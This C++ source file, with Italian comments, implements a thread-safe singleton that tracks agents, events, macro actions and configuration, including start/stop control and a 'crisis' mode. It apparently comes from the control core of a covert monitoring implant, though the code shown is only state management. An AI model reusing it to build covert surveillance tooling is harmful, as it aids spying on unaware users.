#include "Status.h"
#include "Conf.h"

/**
* La nostra unica reference a Status
*/
Status* Status::Instance = NULL;
volatile LONG Status::lLock = 0;

Status* Status::self()
{
	while (InterlockedExchange((LPLONG)&lLock, 1) != 0)
		Sleep(1);

	if (Instance == NULL)
		Instance = new(std::nothrow) Status();

	InterlockedExchange((LPLONG)&lLock, 0);

	return Instance;
}

Status::Status() : hActionsLock(INVALID_HANDLE_VALUE), hAgentsLock(INVALID_HANDLE_VALUE), 
hConfigLock(INVALID_HANDLE_VALUE), hEventsLock(INVALID_HANDLE_VALUE), uCrisis(FALSE) {
	hActionsLock = CreateMutex(NULL, FALSE, NULL);
	hAgentsLock = CreateMutex(NULL, FALSE, NULL);
	hEventsLock = CreateMutex(NULL, FALSE, NULL);
	hConfigLock = CreateMutex(NULL, FALSE, NULL);

	agents.clear();
	events.clear();
	actions.clear();
	config.clear();
}

Status::~Status() {
	if (hActionsLock != INVALID_HANDLE_VALUE)
		CloseHandle(hActionsLock);

	if(hAgentsLock != INVALID_HANDLE_VALUE)
		CloseHandle(hAgentsLock);

	if (hEventsLock != INVALID_HANDLE_VALUE)
		CloseHandle(hEventsLock);

	if (hConfigLock != INVALID_HANDLE_VALUE)
		CloseHandle(hConfigLock);
}

// Chi fa la get* dovrebbe controllare e lockare i relativi semafori
map<UINT, AgentStruct>& Status::GetAgentsList() {
	return agents;
}

map<pair<UINT, UINT>, EventStruct>& Status::GetEventsList() {
	return events;
}

map<UINT, MacroActionStruct>& Status::GetActionsList() {
	return actions;
}

list<ConfStruct> const& Status::GetConfigStruct() {
	return config;
}

void Status::StartCrisis(UINT uType) {
	uCrisis = uType;
}

void Status::StopCrisis() {
	uCrisis = CRISIS_NONE;
}

UINT Status::Crisis() {
	return uCrisis;
}

BOOL Status::AddAgent(AgentStruct &pAgent) {
	// Gestiamo l'accesso concorrente
	WAIT_AND_SIGNAL(hAgentsLock);

	agents[pAgent.uAgentId] = pAgent;

	UNLOCK(hAgentsLock);
	return TRUE;
}

// Come chiave per la mappa usiamo uEventType e pParams perche' e' possibile che ci siano
// due o piu' EventId uguali che triggerano la stessa azione. Attenzione: se
// vengono inseriti due eventi senza parametri e che triggerano la stessa azione,
// vengono considerati come lo stesso evento!
BOOL Status::AddEvent(EventStruct &pEvent) {
	WAIT_AND_SIGNAL(hEventsLock);
	pair<UINT, UINT> eventKey(pEvent.uEventType ^ (UINT)pEvent.pParams, pEvent.uActionId);

	events[eventKey] = pEvent;

	UNLOCK(hEventsLock);
	return TRUE;
}

BOOL Status::AddAction(UINT uMapKey, MacroActionStruct &pAction) {
	WAIT_AND_SIGNAL(hActionsLock);

	actions[uMapKey] = pAction;

	UNLOCK(hActionsLock);
	return TRUE;
}

BOOL Status::AddConf(ConfStruct &pConf) {
	WAIT_AND_SIGNAL(hConfigLock);

	config.push_back(pConf);

	UNLOCK(hConfigLock);
	return TRUE;
}

BOOL Status::ThreadAgentStopped(UINT uAgentId) {
	WAIT_AND_SIGNAL(hAgentsLock);

	if (agents[uAgentId].uAgentId != uAgentId) {
		UNLOCK(hAgentsLock);
		return FALSE;
	}

	agents[uAgentId].uAgentStatus = AGENT_STOPPED;
	agents[uAgentId].uCommand = NO_COMMAND;
	
	UNLOCK(hAgentsLock);
	return TRUE;
}

BOOL Status::StopAgent(UINT uAgentId) {
	WAIT_AND_SIGNAL(hAgentsLock);
	AgentStruct currAgent = agents[uAgentId];

	if (currAgent.uAgentId != uAgentId || currAgent.uAgentStatus != AGENT_RUNNING) {
		UNLOCK(hAgentsLock);
		return FALSE;
	}

	agents[uAgentId].uCommand = AGENT_STOP;

	UNLOCK(hAgentsLock);
	return TRUE;
}

BOOL Status::StopAgents() {
	WAIT_AND_SIGNAL(hAgentsLock);
	map<UINT, AgentStruct>::iterator iter;

	for (iter = agents.begin(); iter != agents.end(); iter++) {
		if (iter->second.uAgentStatus == AGENT_RUNNING)
			iter->second.uCommand = AGENT_STOP;
	}

	UNLOCK(hAgentsLock);
	return TRUE;
}

UINT Status::CountEnabledAgents() {
	WAIT_AND_SIGNAL(hAgentsLock);
	map<UINT, AgentStruct>::iterator iter;
	UINT uEnabled = 0;

	for (iter = agents.begin(); iter != agents.end(); iter++) {
		if (iter->second.uAgentStatus == AGENT_ENABLED)
			uEnabled++;
	}

	UNLOCK(hAgentsLock);
	return uEnabled;
}

BOOL Status::ReEnableAgent(UINT uAgentId) {
	WAIT_AND_SIGNAL(hAgentsLock);
	AgentStruct currAgent = agents[uAgentId];

	if (currAgent.uAgentId != uAgentId || currAgent.uAgentStatus != AGENT_STOPPED) {
		UNLOCK(hAgentsLock);
		return FALSE;
	}

	agents[uAgentId].uAgentStatus = AGENT_ENABLED;

	UNLOCK(hAgentsLock);
	return TRUE;
}

BOOL Status::ReEnableAgents() {
	WAIT_AND_SIGNAL(hAgentsLock);
	map<UINT, AgentStruct>::iterator iter;

	for (iter = agents.begin(); iter != agents.end(); iter++) {
		if (iter->second.uAgentStatus == AGENT_STOPPED)
			iter->second.uAgentStatus = AGENT_ENABLED;
	}

	UNLOCK(hAgentsLock);
	return TRUE;
}

BOOL Status::AgentQueryStop(UINT uAgentId) {
	WAIT_AND_SIGNAL(hAgentsLock);
	AgentStruct currAgent = agents[uAgentId];

	if (currAgent.uAgentId != uAgentId || currAgent.uCommand != AGENT_STOP) {
		UNLOCK(hAgentsLock);
		return FALSE;
	}

	UNLOCK(hAgentsLock);
	return TRUE;
}

UINT Status::AgentQueryStatus(UINT uAgentId) {
	WAIT_AND_SIGNAL(hAgentsLock);
	AgentStruct currAgent;
	UINT uStatus;

	currAgent = agents[uAgentId];

	if (currAgent.uAgentId != uAgentId) {
		UNLOCK(hAgentsLock);
		return 0;
	}

	uStatus = currAgent.uAgentStatus;

	UNLOCK(hAgentsLock);
	return uStatus;
}

BOOL Status::AgentCheckAndStop(UINT uAgentId) {
	WAIT_AND_SIGNAL(hAgentsLock);
	AgentStruct currAgent = agents[uAgentId];

	if (currAgent.uAgentId != uAgentId || currAgent.uCommand != AGENT_STOP) {
		DBG_TRACE(L"Debug - Status.cpp - AgentCheckAndStop() FAILED [0]\n", 4, FALSE);
		UNLOCK(hAgentsLock);
		return FALSE;
	}

	currAgent.uAgentStatus = AGENT_STOPPED;
	currAgent.uCommand = 0;

	agents[uAgentId] = currAgent;

	UNLOCK(hAgentsLock);
	return TRUE;
}

BOOL Status::AgentAlive(UINT uAgentId) {
	WAIT_AND_SIGNAL(hAgentsLock);

	if (agents[uAgentId].uAgentId != uAgentId) {
		DBG_TRACE(L"Debug - Status.cpp - AgentAlive() FAILED [0]\n", 4, FALSE);
		UNLOCK(hAgentsLock);
		return FALSE;
	}

	agents[uAgentId].uAgentStatus = AGENT_RUNNING;

	UNLOCK(hAgentsLock);
	return TRUE;
}

DWORD Status::AgentGetThreadProc(UINT uAgentId) {
	WAIT_AND_SIGNAL(hAgentsLock);
	DWORD dwProc;

	if (agents[uAgentId].uAgentId != uAgentId) {
		DBG_TRACE(L"Debug - Status.cpp - AgentGetThreadProc() FAILED [0]\n", 4, FALSE);
		UNLOCK(hAgentsLock);
		return 0;
	}

	dwProc = (DWORD)agents[uAgentId].pFunc;

	UNLOCK(hAgentsLock);
	return dwProc;
}

BOOL Status::AgentSetThreadProc(UINT uAgentId, PVOID pThreadRoutine) {
	WAIT_AND_SIGNAL(hAgentsLock);

	if (agents[uAgentId].uAgentId != uAgentId) {
		DBG_TRACE(L"Debug - Status.cpp - AgentSetThreadProc() FAILED [0]\n", 4, FALSE);
		UNLOCK(hAgentsLock);
		return FALSE;
	}

	agents[uAgentId].pFunc = pThreadRoutine;

	UNLOCK(hAgentsLock);
	return TRUE;
}

BOOL Status::IsValidAgent(UINT uAgentId) {
	WAIT_AND_SIGNAL(hAgentsLock);
	map<UINT, AgentStruct>::const_iterator iter;

	iter = agents.find(uAgentId);

	if (iter == agents.end()) {
		UNLOCK(hAgentsLock);
		return FALSE;
	}

	UNLOCK(hAgentsLock);
	return TRUE;
}

AgentStruct const& Status::AgentGetParams(UINT uAgentId) {
	return agents[uAgentId];
}

BOOL Status::EventAlive(pEventStruct pEvent) {
	WAIT_AND_SIGNAL(hEventsLock);
	pair<UINT, UINT> eventKey(pEvent->uEventType ^ (UINT)(pEvent->pParams), pEvent->uActionId);

	if (events[eventKey].uEventType != pEvent->uEventType || events[eventKey].uActionId != pEvent->uActionId) {
		DBG_TRACE(L"Debug - Status.cpp - EventAlive() FAILED [0]\n", 4, FALSE);
		UNLOCK(hEventsLock);
		return FALSE;
	}

	events[eventKey].uEventStatus = EVENT_RUNNING;

	UNLOCK(hEventsLock);
	return TRUE;
}

UINT Status::EventQueryStatus(pEventStruct pEvent) {
	WAIT_AND_SIGNAL(hEventsLock);
	pair<UINT, UINT> eventKey(pEvent->uEventType ^ (UINT)(pEvent->pParams), pEvent->uActionId);
	EventStruct currEvent;
	UINT uStatus;

	currEvent = events[eventKey];

	if (currEvent.uEventType != pEvent->uEventType) {
		UNLOCK(hEventsLock);
		return 0;
	}

	uStatus = currEvent.uEventStatus;

	UNLOCK(hEventsLock);
	return uStatus;
}

BOOL Status::EventQueryStop(pEventStruct pEvent) {
	WAIT_AND_SIGNAL(hEventsLock);
	EventStruct currEvent;
	pair<UINT, UINT> eventKey(pEvent->uEventType ^ (UINT)(pEvent->pParams), pEvent->uActionId);

	currEvent = events[eventKey];

	if (currEvent.uEventType != pEvent->uEventType || currEvent.uActionId != pEvent->uActionId || currEvent.uCommand != EVENT_STOP) {
		DBG_TRACE(L"Debug - Status.cpp - EventQueryStop() [Don't Stop] [0]\n", 7, FALSE);
		UNLOCK(hEventsLock);
		return FALSE;
	}

	DBG_TRACE(L"Debug - Status.cpp - EventQueryStop() [Stop Event]\n", 4, FALSE);
	UNLOCK(hEventsLock);
	return TRUE;
}

BOOL Status::StopEvents() {
	WAIT_AND_SIGNAL(hEventsLock);
	map<pair<UINT, UINT>, EventStruct>::iterator iter;

	for (iter = events.begin(); iter != events.end(); iter++) {
		if (iter->second.uEventStatus == EVENT_RUNNING)
			iter->second.uCommand = EVENT_STOP;
	}

	UNLOCK(hEventsLock);
	return TRUE;
}

BOOL Status::TriggerAction(UINT uActionId) {
	WAIT_AND_SIGNAL(hActionsLock);

	if (uActionId == CONF_ACTION_NULL || actions.size() <= uActionId) {
		DBG_TRACE(L"Debug - Status.cpp - TriggerAction() FAILED [Action Null or Invalid ActionId]\n", 4, FALSE);
		UNLOCK(hActionsLock);
		return FALSE;
	}

	actions[uActionId].bTriggered = TRUE;

	UNLOCK(hActionsLock);
	return TRUE;
}

BOOL Status::ThreadEventStopped(pEventStruct pEvent) {
	WAIT_AND_SIGNAL(hEventsLock);
	EventStruct currEvent;
	pair<UINT, UINT> eventKey(pEvent->uEventType ^ (UINT)(pEvent->pParams), pEvent->uActionId);

	currEvent = events[eventKey];

	if (currEvent.uEventType != pEvent->uEventType || currEvent.uActionId != pEvent->uActionId) {
		DBG_TRACE(L"Debug - Status.cpp - ThreadEventStopped() FAILED [0]\n", 4, FALSE);
		UNLOCK(hEventsLock);
		return FALSE;
	}

	currEvent.uEventStatus = EVENT_STOPPED;
	currEvent.uCommand = NO_COMMAND;

	events[eventKey] = currEvent;
	UNLOCK(hEventsLock);
	return TRUE;
}

// Questa funzione deve essere bloccante e va chiamata dopo aver invocato
// StopAgents() e StopEvents() da dentro Task.
BOOL Status::Clear() {
	map<UINT, AgentStruct>::iterator iterAgent;
	map<pair<UINT, UINT>, EventStruct>::iterator iterEvent;
	map<UINT, MacroActionStruct>::iterator iterAction;
	list<ConfStruct>::iterator iterConf;
	UINT i;

	WAIT_AND_SIGNAL(hAgentsLock);
	// Loopa qui dentro finche' tutti gli agenti non sono fermi
	for (iterAgent = agents.begin(); iterAgent != agents.end(); iterAgent++) {
		while (iterAgent->second.uAgentStatus == AGENT_RUNNING) {
			UNLOCK(hAgentsLock);
			Sleep(MAX_WAIT_TIME);
			WAIT_AND_SIGNAL(hAgentsLock);
		}
	}

	// Liberiamo la memoria
	for (iterAgent = agents.begin(); iterAgent != agents.end(); iterAgent++) {
		if (iterAgent->second.uParamLength && iterAgent->second.pParams) {
			delete[] iterAgent->second.pParams;
		}
	}

	agents.clear();
	UNLOCK(hAgentsLock);

	WAIT_AND_SIGNAL(hEventsLock);
	// Loopa qui dentro finche' tutti i monitor non sono fermi
	for (iterEvent = events.begin(); iterEvent != events.end(); iterEvent++) {
		while (iterEvent->second.uEventStatus == EVENT_RUNNING) {
			UNLOCK(hEventsLock);
			Sleep(MAX_WAIT_TIME);
			WAIT_AND_SIGNAL(hEventsLock);
		}
	}

	// Liberiamo la memoria
	for (iterEvent = events.begin(); iterEvent != events.end(); iterEvent++) {
		if (iterEvent->second.uParamLength && iterEvent->second.pParams) {
			delete[] iterEvent->second.pParams;
		}
	}

	events.clear();
	UNLOCK(hEventsLock);

	WAIT_AND_SIGNAL(hActionsLock);
	// Loopa qui dentro finche' tutti i monitor non sono fermi
	for (iterAction = actions.begin(); iterAction != actions.end(); iterAction++) {
		pActionStruct ptr = iterAction->second.pActions;
		for (i = 0; i < iterAction->second.uSubActions; i++, ptr++) {
			if (ptr->pParams == NULL)
				continue;

			delete[] ptr->pParams;
			ptr->pParams = NULL;
		}

		delete[] iterAction->second.pActions;
	}

	actions.clear();
	UNLOCK(hActionsLock);

	WAIT_AND_SIGNAL(hConfigLock);
	// Rimuoviamo le opzioni di configurazione
	for (iterConf = config.begin(); iterConf != config.end(); iterConf++) {
		if ((*iterConf).pParams)
			delete[] (*iterConf).pParams;
	}

	config.clear();
	UNLOCK(hConfigLock);

	return TRUE;
}